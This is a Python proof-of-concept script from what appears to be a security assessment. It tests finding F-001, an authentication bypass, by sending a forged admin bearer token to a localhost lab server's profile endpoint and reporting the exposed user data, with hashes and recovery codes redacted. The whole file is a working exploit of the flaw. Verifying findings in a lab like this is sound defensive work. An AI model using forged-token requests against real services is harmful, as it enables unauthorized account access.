"""
PoC: F-001 — Authentication Bypass via Forged Admin Token
World Monitor Security Assessment — SIH26163 (NTRO)

SAFE PoC — Only targets localhost lab environment.
Prerequisites: Lab server running at http://127.0.0.1:8001
"""
import httpx

TARGET = "http://127.0.0.1:8001"
FORGED_TOKEN = "wm_forged_admin_test_signature"

print("=" * 60)
print("F-001: Authentication Bypass via Forged Token")
print("=" * 60)
print(f"Target:       {TARGET}/api/users/profile")
print(f"Forged Token: {FORGED_TOKEN}")
print()

resp = httpx.get(
    f"{TARGET}/api/users/profile",
    headers={"Authorization": f"Bearer {FORGED_TOKEN}"}
)

print(f"HTTP Status: {resp.status_code}")
if resp.status_code == 200:
    data = resp.json()
    print(f"[CONFIRMED] Authentication bypassed!")
    print(f"  → Username: {data.get('username')}")
    print(f"  → Role:     {data.get('role')}")
    print(f"  → Email:    {data.get('email')}")
    # Redact sensitive values for safe output
    if "password_hash" in data:
        print(f"  → password_hash: <REDACTED_HASH_PRESENT>")
    if "recovery_codes" in data:
        print(f"  → recovery_codes: <REDACTED_CODES_PRESENT>")
    print()
    print("IMPACT: Unauthenticated attacker gained admin session.")
else:
    print(f"[FIXED] Server returned {resp.status_code} — authentication bypass mitigated.")

print()
print("Safe PoC complete. No production systems contacted.")
